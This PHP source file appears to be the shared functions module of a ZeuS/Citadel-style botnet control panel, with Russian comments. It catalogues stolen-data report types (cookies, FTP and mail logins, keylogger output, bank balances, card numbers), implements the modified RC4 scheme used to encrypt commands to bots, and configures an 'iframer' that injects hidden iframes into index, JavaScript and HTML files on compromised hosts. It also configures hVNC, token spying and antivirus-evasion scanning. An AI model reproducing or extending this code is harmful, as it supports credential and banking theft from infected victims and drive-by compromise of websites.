<?php error_reporting(E_ALL); set_time_limit(0); mb_internal_encoding('UTF-8'); mb_regex_encoding('UTF-8'); umask(0);

require_once dirname(__FILE__).'/global-const.php';

///////////////////////////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////////////////////////

/** Get the list of all report types, mapped to their human-readable representation
 * @return string[]
 */
function report_types(){
    return array(
        BLT_UNKNOWN => LNG_BLT_UNKNOWN,
        BLT_COOKIES => LNG_BLT_COOKIES,
        BLT_FILE => LNG_BLT_FILE,
        BLT_DEBUG => LNG_BLT_DEBUG,
        BLT_HTTP_REQUEST => LNG_BLT_HTTP_REQUEST,
        BLT_HTTPS_REQUEST => LNG_BLT_HTTPS_REQUEST,
        BLT_LUHN10_REQUEST => LNG_BLT_LUHN10_REQUEST,
        BLT_LOGIN_FTP => LNG_BLT_LOGIN_FTP,
        BLT_LOGIN_POP3 => LNG_BLT_LOGIN_POP3,
        BLT_FILE_SEARCH => LNG_BLT_FILE_SEARCH,
        BLT_KEYLOGGER => LNG_BLT_KEYLOGGER,
        BLT_FLASHINFECT => LNG_BLT_FLASHINFECT,
        BLT_GRABBED_UI => LNG_BLT_GRABBED_UI,
        BLT_GRABBED_HTTP => LNG_BLT_GRABBED_HTTP,
        BLT_GRABBED_WSOCKET => LNG_BLT_GRABBED_WSOCKET,
        BLT_GRABBED_FTPSOFTWARE => LNG_BLT_GRABBED_FTPSOFTWARE,
        BLT_GRABBED_EMAILSOFTWARE => LNG_BLT_GRABBED_EMAILSOFTWARE,
        BLT_GRABBED_OTHER => LNG_BLT_GRABBED_OTHER,
        BLT_GRABBED_BALANCE => LNG_BLT_GRABBED_BALANCE,
        BLT_COMMANDLINE_RESULT => LNG_BLT_COMMANDLINE_RESULT,
        BLT_ANALYTICS_SOFTWARE => LNG_BLT_ANALYTICS_SOFTWARE,
        BLT_ANALYTICS_FIREWALL => LNG_BLT_ANALYTICS_FIREWALL,
        BLT_ANALYTICS_ANTIVIRUS => LNG_BLT_ANALYTICS_ANTIVIRUS,
    );
}

/*
  Преобразование BLT_* в строку.

  IN $type - int, BLT_* для преобразование.

  Return   - string, строкове представление BLT_*.
*/
function bltToLng($type){
    $types = report_types();
    return isset($types[$type])? $types[$type] : (  LNG_BLT_UNKNOWN.' (type='.$type.')'  );
}

/*
  Добавление заголовков HTTP для предотврашения кэширования браузером.
*/
function httpNoCacheHeaders()
{
  header('Expires: Fri, 01 Jan 1990 00:00:00 GMT'); //...
  header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0, pre-check=0, post-check=0'); //HTTP/1.1
  header('Pragma: no-cache'); // HTTP/1.0
}

/*
  Проверяет сущетвует ли в путе указатель на уровень выше '..'.
  
  IN $path - string, путь для проверки.
  
  Return   - bool, true - если сущетвует, false - если не сущетвует.
*/
function pathUpLevelExists($path)
{
  return (strstr('/'.str_replace('\\', '/', $path).'/', '/../') === FALSE ? FALSE : TRUE);
}

/*
  Надстройка над basename, которая обрабатывает оба типа слеша, независимо от платформы.
  
  IN $path - string, строка для обработки.
  
  Return   - string, базовое имя.
*/
function baseNameEx($path)
{
  return basename(str_replace('\\', '/', $path));
}

/*
  Преобразование GMT в текстовое представление.
  
  IN $bias - int, GMT в секундах.
  
  Return   - string, GMT в текстовое представление.
*/
function timeBiasToText($bias)
{
  return ($bias >= 0 ? '+' : '-').abs(intval($bias / 3600)).':'.sprintf('%02u', abs(intval($bias % 60)));
}

/*
  Преобразование TickCount в hh:mm:ss
  
  IN $tc - int, TickCount.
  
  Return - string, hh:mm:ss.
*/
function tickCountToText($tc)
{
  return sprintf('%02u:%02u:%02u', $tc / 3600, $tc / 60 - (sprintf('%u', ($tc / 3600)) * 60), $tc - (sprintf('%u', ($tc / 60)) * 60));
}

/*
  Добавление слешей в стиле JavaScript.
  
  IN $string - string, строка для обработки.
  
  Return     - форматированя строка.
*/
function addJsSlashes($string)
{
  return addcslashes($string, "\\/\'\"");
}

/*
  Надстройка для htmlentities, для форматирования в UTF-8.
  
  IN $string - string, строка для обработки.
  
  Return     - форматированя строка.
*/
function htmlEntitiesEx($string)
{
  /*
    HTML uses the standard UNICODE Consortium character repertoire, and it leaves undefined (among
    others) 65 character codes (0 to 31 inclusive and 127 to 159 inclusive) that are sometimes
    used for typographical quote marks and similar in proprietary character sets.
  */
  return htmlspecialchars(preg_replace('|[\x00-\x09\x0B\x0C\x0E-\x1F\x7F-\x9F]|u', ' ', $string), ENT_QUOTES, 'UTF-8');
}

/*
  Надстройка для number_format, для форматирования в int формате для текущего языка.
  
  IN $number - int, число для обработки.
  
  Return     - string, отформатированое число.
*/
function numberFormatAsInt($number)
{
  return number_format($number, 0, '.', ' ');
}

/** Convert binary IP-address to string
 * The binary data comes from the `botnet_list` table
 * @param string[4] $ip
 * @return string
 */
function binaryIpToString($ip){
    $ip = @unpack('N', $ip);
    return @long2ip($ip[1]);
}

/*
  Надстройка для number_format, для форматирования в float формате для текущего языка.
  
  IN $number   - float, число для обработки.
  IN $decimals - количетсво цифр в дробной части.
  
  Return     - string, отформатированое число.
*/
function numberFormatAsFloat($number, $decimals)
{
  return number_format($number, $decimals, '.', ' ');
}

/*
  Преобразование числа в версию.
  
  IN $i  - int, число для обработки.
  
  Return - string, версия.
*/
function intToVersion($i)
{
  return sprintf("%u.%u.%u.%u", ($i >> 24) & 0xFF, ($i >> 16) & 0xFF,($i >> 8) & 0xFF, $i & 0xFF);
}

/*
  Конвертация данных о версии OS в строку.
  
  IN $os_data - string, данные OS.
  
  Return      - string, строквое представление версии OS.
*/
function osDataToString($os_data)
{
  $name = 'Unknown';
  if(strlen($os_data) == 6 /*sizeof(OSINFO)*/)
  {
    $data = @unpack('Cversion/Csp/Sbuild/Sarch', $os_data);
    
    //Базовое название.
    switch($data['version'])
    {
      case 2: $name = 'XP'; break;
      case 3: $name = 'Server 2003'; break;
      case 4: $name = 'Vista'; break;
      case 5: $name = 'Server 2008'; break;
      case 6: $name = 'Seven'; break;
      case 7: $name = 'Server 2008 R2'; break;
    }
    
    //Архитектура.
    if($data['arch'] == 9 /*PROCESSOR_ARCHITECTURE_AMD64*/)$name .= ' x64';
   
    //Сервиспак.
    if($data['sp'] > 0)$name .= ', SP '.$data['sp'];
  }
  return $name;
}

/*
  Конвертация строки в строку с закоментроваными спец. символами SQL маски.
  
  IN $str - string, исходная строка.
  
  Return  - string, конченая строка.
*/
function toSqlSafeMask($str)
{
  return str_replace(array('%', '_'), array('\%', '\_'), $str);
}

/*
  Получение списка таблиц отчетов по дням.
  
  IN $db - string, БД, из которой будет получены таблицы.
  
  Return - array, список таблиц, отсортированый по имени.
*/
function listReportTables($db = NULL)
{
    $from = empty($db)? '' : " FROM `$db` ";
    $r = mysql_query('SHOW TABLES LIKE "botnet_reports_%";');
    $tables = array();
    while (!is_bool($t = mysql_fetch_row($r)))
        $tables[] = $t[0];
    sort($tables);
    return $tables;
}

/*
  Проверка корректности значений переменной из массива $_POST.

  IN $name     - string, имя.
  IN $min_size - минимальная длина.
  IN $max_size - максимальная длина.

  Return       - NULL - если не значение не походит под условия,
                 string - значение переменной.
*/
function checkPostData($name, $min_size, $max_size)
{
  $data = isset($_POST[$name]) ? trim($_POST[$name]) : '';
  $s = mb_strlen($data);
  if($s < $min_size || $s > $max_size)return NULL;
  return $data;
}

/*
  Подключение к базе и установка основных параметров.
  
  Return - bool, true - в случуи успеха, false в случаи ошибки.
*/
function connectToDb($persistent = FALSE)
{
	if (!$persistent){
	  if(!@mysql_connect($GLOBALS['config']['mysql_host'], $GLOBALS['config']['mysql_user'], $GLOBALS['config']['mysql_pass']))
		  return FALSE;
	} else {
		if (!@mysql_pconnect($GLOBALS['config']['mysql_host'], $GLOBALS['config']['mysql_user'], $GLOBALS['config']['mysql_pass']))
			return FALSE;
	}
  if (!@mysql_query('SET NAMES \''.MYSQL_CODEPAGE.'\' COLLATE \''.MYSQL_COLLATE.'\''))
	  return FALSE;
  if (!@mysql_select_db($GLOBALS['config']['mysql_db']))
	  return FALSE;
  return TRUE;
}

/*
  Выполнение MySQL запроса, с возможностью автоматического восттановления поврежденной таблицы.
  Функция актуальна только для MyISAM.
  
  IN $table - название таблицы.
  IN $query - запрос.
  
  Return    - заначение согласно mysql_query().
*/
function mysqlQueryEx($table, $query)
{
  $r = @mysql_query($query); 
  if($r === FALSE)
  {
    $err = @mysql_errno();
    if(($err === 145 || $err === 1194) && @mysql_query("REPAIR TABLE `{$table}`") !== FALSE)$r = @mysql_query($query);
  }
  return $r;
}

/*
  Инициализация RC4 ключа.
  
  IN $key - string, текстовый ключ.
  Return  - array, бинарный ключ.
*/
function rc4Init($key)
{
  $hash      = array();
  $box       = array();
  $keyLength = strlen($key);
  
  for($x = 0; $x < 256; $x++)
  {
    $hash[$x] = ord($key[$x % $keyLength]);
    $box[$x]  = $x;
  }

  for($y = $x = 0; $x < 256; $x++)
  {
    $y       = ($y + $box[$x] + $hash[$x]) % 256;
    $tmp     = $box[$x];
    $box[$x] = $box[$y];
    $box[$y] = $tmp;
  }
  
  $magicKey = pack("V", BO_CRYPT_SALT);
  $magicKeyLen = strlen($magicKey);
  
  for($y = $x = 0; $x < 256; $x++)
  {
    $magicKeyPart1 = ord($magicKey[$y])  & 0x07;
    $magicKeyPart2 = ord($magicKey[$y]) >> 0x03;
    if (++$y == $magicKeyLen) $y = 0;

    switch ($magicKeyPart1){
      case 0: $box[$x]  = ~$box[$x]; break;
      case 1: $box[$x] ^= $magicKeyPart2; break;
      case 2: $box[$x] += $magicKeyPart2; break;
      case 3: $box[$x] -= $magicKeyPart2; break;
      case 4: $box[$x]  = $box[$x] >> ($magicKeyPart2%8) | ($box[$x] << (8-($magicKeyPart2%8))); break;
      case 5: $box[$x]  = $box[$x] << ($magicKeyPart2%8) | ($box[$x] >> (8-($magicKeyPart2%8))); break;
      case 6: $box[$x] += 1; break;
      case 7: $box[$x] -= 1; break;
    }
    $box[$x] = $box[$x] & 0xFF;
  }

  return $box;
}

/*
  Широфвание RC4.
  
  IN OUT $data - string, данные для шифрования.
  IN $key      - string, ключ шифрования от rc4Init().
*/
function rc4(&$data, $key)
{
  $len = strlen($data);
  $loginKey = BO_LOGIN_KEY;
  $loginKeyLen = strlen(BO_LOGIN_KEY);
  for($z = $y = $x = $w = 0; $x < $len; $x++)
  {
    $z = ($z + 1) % 256;
    $y = ($y + $key[$z]) % 256;
    $tmp      = $key[$z];
    $key[$z]  = $key[$y];
    $key[$y]  = $tmp;
    $data[$x] = chr(ord($data[$x]) ^ ($key[(($key[$z] + $key[$y]) % 256)]));
    $data[$x] = chr(ord($data[$x]) ^ ord($loginKey[$w]));
    if (++$w == $loginKeyLen) $w = 0;
  }
}

/*
  Визуальное шифрование.
  
  IN OUT $data - string, данные для шифрования.
*/
function visualEncrypt(&$data)
{
  $len = strlen($data);
  for($i = 1; $i < $len; $i++)$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
}

/*
  Визуальное дешифрование.
  
  IN OUT $data - string, данные для шифрования.
*/
function visualDecrypt(&$data)
{
  $len = strlen($data);
  if($len > 0)for($i = $len - 1; $i > 0; $i--)$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
}

/** In-place symmetric encryption based on SALT & key
 * @param string $data
 * @param string $key
 * @param int $salt
 */
function smartEncrypt(&$data, $key){
    $data_sz = strlen($data);
    $key_sz = strlen($key);

    $salt = BO_CRYPT_SALT;

    for ($i = 0; $i < $data_sz ; $i++)
        $data[$i] = chr(
            ord($data[$i]) ^
            ord($key[  $i%$key_sz  ]) ^
            (($salt >> (8*($i%4)) | $salt << (8*(4-($i%4)))) & 0xFF)
        );
}

/** Make-up the binary response
 * @param int $replyCount
 * @param string $replyData
 * @return string
 */
function mkBinaryResponsePacket($replyCount, $replyData, $flags = 0){
    global $config;

    # Generate the header
    $headerPrefix = '';
    for ($len=0; $len<HEADER_PREFIX; $len+=4)
        $headerPrefix .= pack('L', mt_rand());

    # Make-up the packet
    $replyData_sz = strlen($replyData);

    $packet =
        pack('LLL', HEADER_SIZE + $replyData_sz, $flags, $replyCount).
        md5($replyData, true).
        $replyData
    ;

    # Encrypt
    smartEncrypt($packet, $headerPrefix);
    $packet = $headerPrefix . $packet;
    visualEncrypt($packet);
    rc4($packet, $config['botnet_cryptkey_bin']);

    # Finish
    return $packet;
}

/*
  Создание директории, включая весь путь.
  
  IN $dir - string, директория.
*/
function createDir($dir)
{
  $ll = explode('/', str_replace('\\', '/', $dir));
  $cur = '';
  
  foreach($ll as $d)if($d != '..' && $d != '.' && strlen($d) > 0)
  {
    $cur .= $d.'/';
    if(!is_dir($cur) && !@mkdir($cur, 0777))return FALSE;
  }
  return TRUE;
}

/** Generate NodeJS authentication token
 * @return string
 */
function nodejs_generate_token($login){
    if (!isset($GLOBALS['config']['nodejs']))
        return '';
    return $login.':'.md5($login.':'.$GLOBALS['config']['nodejs']['token']);
}

/** Get a config array for window.nodejs
 * @return array|null
 */
function nodejs_config(){
    if (!isset($GLOBALS['config']['nodejs']))
        return null;
    if (empty($_SESSION['name']))
        return null;

    $nodejs = array(
        'token' => nodejs_generate_token($_SESSION['name'])
    ) + $GLOBALS['config']['nodejs'];

    // Express endpoint
    $nodejs['express'] = "http://{$nodejs['host']}:{$nodejs['port']}/";

    // Socket.io source
    $nodejs['socketio'] = "//{$nodejs['host']}:{$nodejs['port']}/socket.io/socket.io.js";

    return $nodejs;
}

/** Check NodeJS connection
 * @return bool
 */
function nodejs_test_connection($flashmsg = false){
    # Configured?
    if (empty($GLOBALS['config']['nodejs'])){
        if ($flashmsg)
            flashmsg('err', 'NodeJS is not configured!');
        return false;
    }

    # Connection?
    $f = @fsockopen($h = $GLOBALS['config']['nodejs']['host'], $p = $GLOBALS['config']['nodejs']['port'], $errno, $errstr, 1);

    if (!$f){
        if ($flashmsg)
            flashmsg('err', 'NodeJS connection to `:host::port` failed: :errstr! Is it running?', array(
                ':errstr' => $errstr,
                ':host' => $h, ':port' => $p,
            ));
        return false;
    }

    # Ok
    fclose($f);
    return true;
}

/** Get the <script> tag to include socket.io
 * @return string
 */
function nodejs_socketio_script(){
    $nodejs = nodejs_config();
    $vars = jsonset(array('window.nodejs' => $nodejs));
    $script = "<script src='{$nodejs['socketio']}'></script>";
    return $vars.$script;
}

function config_gefault_values(){
	return array(
		'mysql_host' => '127.0.0.1',
		'mysql_user' => '',
		'mysql_pass' => '',
		'mysql_db' => '',

		'reports_path' => '_reports',
		'reports_to_db' => 0,
		'reports_to_fs' => 0,
		'reports_geoip' => 0,
		'reports_botnetactivity' => 1,

		'jabber' => array('login' => '', 'pass' => '', 'host' => '', 'port' => 5222),

		'reports_jn' => 0,
		'reports_jn_logfile' => '',
		'reports_jn_to' => '',
		'reports_jn_list' => '',
		'reports_jn_botmasks' => '',
		'reports_jn_masks' => array(
            'wentOnline' => '',
            'software' => '',
            'cmd' => '',
            'reports_jn_masks' => array(),
        ),
		'reports_jn_script' => '',

		'scan4you_jid' => '',
		'scan4you_id' => '',
		'scan4you_token' => '',

		'accparse_jid' => '',
		'vnc_server' => '',
		'hvnc_server' => '',
		'vnc_notify_jid' => '',

		'reports_deduplication' => 1,

		'iframer' => array(
			'url' => '',
			'html' => '<iframe src="http://example.com/" width=1 height=1 style="visibility: hidden"></iframe>',
			'mode' => 'off', # off | checkonly | inject | preview
			'inject' => 'smart', # smart | append | overwrite
			'traverse' => array(
				'depth' => 3,
				'dir_masks' => array('*www*', 'public*', 'domain*', '*host*', 'ht*docs', '*site*', '*web*'),
				'file_masks' => array('index.*', '*.js', '*.htm*'),
				),
			'opt' => array(
				'reiframe_days' => 0,
				'process_delay' => 0,
				),
			),

		'named_preset' => array(),
		'db-connect' => array(),

        'mailer' => array(
            'master_email' => '',
            'script_url' => '',
            'send_delay' => '0.0',
        ),

        'filehunter' => array(
            'autodwn' => array(),
            'notify_jids' => array(),
        ),

        'balgrabber' => array(
            'update_only_up' => 1,
            'time_window' => 180,
            'notify_jids' => array(),
            'urls' => array(
                'ignore' => array(),
                'highlight' => array(),
            ),
            'amounts' => array(
                'highlight' => array(),
            ),
        ),

        'flashinfect' => array(
            'usbcount' => 2,
        ),

        'tokenspy' => array(
            'ts.php' => 'http://'.$_SERVER['HTTP_HOST'].'/ts.php',
        ),

        'nodejs' => array(
            'host' => current(explode(':', $_SERVER['HTTP_HOST'])),
            'port' => 8080,
            'token' => null,
        ),

        'bots' => array(
            'autorm' => array(
                'enabled' => false,
                'days' => 5,
                'links' => array(),
                'action' => null,
                'install_url' => null,
            ),
        ),

		'allowed_countries_enabled' => 0,
		'allowed_countries' => '',

		'botnet_timeout' => 0,
		'botnet_cryptkey' => '',
		);
	}

/*
  Обналвения файла конфигурации.
  
  IN $updateList - array, список для обналвения.
  
  Return - true - в случаи успеха,
           false - в случаи ошибки.
*/
function updateConfig($updateList){
	//Пытаемся дать себе права.
	$file    = defined('FILE_CONFIG') ? FILE_CONFIG : 'system/config.php';
	$oldfile = $file.'.old.php';

	@chmod(@dirname($file), 0777);
	@chmod($file,           0777);
	@chmod($oldfile,        0777);

	//Удаляем старый файл.
	@unlink($oldfile);

	//переименовывем текущий конфиг.
	if(is_file($file) && !@rename($file, $oldfile))
		return FALSE;

	# Defaults
	$defaults = config_gefault_values();

	# Collect values
	$write_config = array();
	foreach (array_keys($defaults) as $key)
		if (isset($updateList[$key]))
			$write_config[$key] = $updateList[$key];
		elseif (isset($GLOBALS['config'][$key]))
			$write_config[$key] = $GLOBALS['config'][$key];
		else
			$write_config[$key] = $defaults[$key];

    # Generate values
    $write_config['nodejs']['host'] = current(explode(':', $_SERVER['HTTP_HOST']));
    $write_config['nodejs']['token'] = md5($write_config['nodejs']['host'].$write_config['nodejs']['port'].BO_LOGIN_KEY);

	# Format
	# Update the binary cryptkey
	$cryptkey_bin = md5(BO_LOGIN_KEY, TRUE);
	rc4($cryptkey_bin, rc4Init($write_config['botnet_cryptkey']));
	$cryptkey_bin = rc4Init($cryptkey_bin);

	$cfgData = "<?php\n\$config = ".var_export($write_config, 1).";\n";
	$cfgData .= "\$config['botnet_cryptkey_bin'] = array(".implode(', ', $cryptkey_bin).");\n";
	$cfgData .= "return \$config;\n";

	# Store
	if(@file_put_contents($file, $cfgData) !== strlen($cfgData))
		return FALSE;

    # Reload
    $GLOBALS['config'] = $config = $write_config;

    # INI config export
    $inifile = $file.'.ini';
    $inifileData = <<<INI
[nodejs]
host={$config['nodejs']['host']}
port={$config['nodejs']['port']}
token={$config['nodejs']['token']}

INI;
    if(@file_put_contents($inifile, $inifileData) !== strlen($inifileData)){
        trigger_error('Failed to write to '.$inifile, E_USER_WARNING);
        return FALSE;
    }
    
	return TRUE;
	}
